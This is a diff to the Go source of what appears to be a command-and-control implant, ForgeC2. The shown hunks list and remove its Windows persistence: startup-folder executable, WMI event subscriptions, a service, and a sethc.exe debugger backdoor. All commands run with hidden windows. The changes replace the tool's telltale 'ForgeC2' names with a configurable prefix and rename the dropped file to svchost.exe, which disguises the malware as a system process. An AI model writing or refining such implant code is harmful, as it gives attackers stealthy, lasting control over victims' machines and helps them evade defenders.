@@ -389,26 +389,26 @@ func listPersistence() string {
 
 	startupPath := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe`)
 	if _, err := os.Stat(startupPath); err == nil {
-		results = append(results, "[+] Startup folder: forgec2.exe present")
+		results = append(results, "[+] Startup folder: svchost.exe present")
 	} else {
-		results = append(results, "[-] Startup folder: forgec2.exe not found")
+		results = append(results, "[-] Startup folder: svchost.exe not found")
 	}
 
-	psCmd := `Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match "ForgeC2" } | Format-List | Out-String`
+	psCmd := "Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like \"*" + persistencePrefix + "*\" } | Format-List | Out-String"
 	cmd3 := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
 	applyHideWindow(cmd3)
 	if out, _ := cmd3.CombinedOutput(); len(strings.TrimSpace(string(out))) > 0 {
-		results = append(results, "[+] WMI subscription (ForgeC2): found")
+		results = append(results, "[+] WMI subscription ("+persistencePrefix+"): found")
 	} else {
-		results = append(results, "[-] WMI subscription (ForgeC2): not found")
+		results = append(results, "[-] WMI subscription ("+persistencePrefix+"): not found")
 	}
 
-	cmd4 := exec.Command("sc", "query", "ForgeC2Svc")
+	cmd4 := exec.Command("sc", "query", persistencePrefix+"Svc")
 	applyHideWindow(cmd4)
 	if out, _ := cmd4.CombinedOutput(); strings.Contains(string(out), "RUNNING") || strings.Contains(string(out), "STOPPED") {
-		results = append(results, "[+] Service (ForgeC2Svc): found")
+		results = append(results, "[+] Service ("+persistencePrefix+"Svc): found")
 	} else {
-		results = append(results, "[-] Service (ForgeC2Svc): not found")
+		results = append(results, "[-] Service ("+persistencePrefix+"Svc): not found")
 	}
 
 	cmd5 := exec.Command("reg", "query", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/v", "Debugger")
@@ -480,7 +480,7 @@ func removePersistence(method string, args string) string {
 		return "startup_folder: removed startup file"
 
 	case "wmi":
-		psCmd := `$binding = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match "ForgeC2" }; $binding | Remove-WmiObject; $filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object { $_.Name -match "ForgeC2" }; $filter | Remove-WmiObject; $consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -match "ForgeC2" }; $consumer | Remove-WmiObject; Write-Output "WMI persistence removed"`
+		psCmd := fmt.Sprintf(`$binding = Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -match %q }; $binding | Remove-WmiObject; $filter = Get-WmiObject -Namespace root/subscription -Class __EventFilter | Where-Object { $_.Name -match %q }; $filter | Remove-WmiObject; $consumer = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer | Where-Object { $_.Name -match %q }; $consumer | Remove-WmiObject; Write-Output "WMI persistence removed"`, persistencePrefix, persistencePrefix, persistencePrefix)
 		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", psCmd)
 		applyHideWindow(cmd)
 		out, err := cmd.CombinedOutput()
@@ -491,15 +491,15 @@ func removePersistence(method string, args string) string {
 
 	case "service":
 		cmds := [][]string{
-			{"sc", "stop", "ForgeC2Svc"},
-			{"sc", "delete", "ForgeC2Svc"},
+			{"sc", "stop", persistencePrefix + "Svc"},
+			{"sc", "delete", persistencePrefix + "Svc"},
 		}
 		for _, c := range cmds {
 			rc := exec.Command(c[0], c[1:]...)
 			applyHideWindow(rc)
 			rc.CombinedOutput()
 		}
-		return "service: removed ForgeC2Svc"
+		return "service: removed " + persistencePrefix + "Svc"
 
 	case "image_file":
 		cmd := exec.Command("reg", "delete", `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe`, "/f")
